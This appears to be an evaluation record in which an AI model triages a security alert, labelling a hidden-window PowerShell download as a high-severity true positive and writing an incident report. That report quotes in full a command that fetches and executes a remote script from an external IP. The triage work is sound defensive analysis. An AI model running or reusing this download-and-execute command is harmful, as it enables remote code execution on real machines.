@@ -1,0 +1,54 @@
+{
+  "alert_id": "R005-978f265e",
+  "mode": "baseline",
+  "model": "gemini-3.5-flash-lite",
+  "steps": [],
+  "verdict": {
+    "verdict": "true_positive",
+    "confidence": 1.0,
+    "severity": "high",
+    "techniques": [
+      "T1059.001",
+      "T1140",
+      "T1105"
+    ],
+    "timeline": [
+      {
+        "ts": "2020-11-02 15:00:20 UTC",
+        "description": "PowerShell executed with hidden window and downloaded a remote script from 203.0.113.47",
+        "event_ids": [
+          "E042488"
+        ]
+      }
+    ],
+    "evidence": [
+      {
+        "claim": "PowerShell executed with hidden window flag downloading and executing a remote payload from an external IP address.",
+        "event_ids": [
+          "E042488"
+        ]
+      }
+    ],
+    "next_actions": [
+      "Isolate workstation8 from the network",
+      "Block IP address 203.0.113.47 at the firewall",
+      "Conduct forensic investigation on workstation8"
+    ],
+    "report_md": "### Incident Report: PowerShell Hidden Window or Encrypted Command\n\n**Verdict:** True Positive  \n**Severity:** High  \n**MITRE ATT&CK Techniques:** T1059.001 (PowerShell), T1140 (Deobfuscate/Decode Files or Information), T1105 (Ingress Tool Transfer)\n\n#### Summary\nOn 2020-11-02 at 15:00:20 UTC, `workstation8` generated an alert for a suspicious PowerShell execution. The process executed with flags to hide the window (`-w hidden`) and disable the profile (`-nop`), while utilizing `DownloadString` to download and execute a remote script (`http://203.0.113.47/a.ps1`).\n\n#### Timeline\n- **2020-11-02 15:00:20 UTC (E042488):** `powershell.exe` executed with command line: `powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.47/a.ps1')\"`\n\n#### Next Actions\n1. Isolate workstation8.\n2. Block external IP 203.0.113.47.\n3. Investigate potential follow-on activity."
+  },
+  "citations": {
+    "cited": 1,
+    "valid": 1,
+    "not_retrieved": [],
+    "nonexistent": [],
+    "uncited_claims": 0
+  },
+  "usage": {
+    "llm_calls": 1,
+    "tool_calls": 0,
+    "input_tokens": 693,
+    "output_tokens": 535,
+    "latency_s": 2.45
+  },
+  "error": null
+}
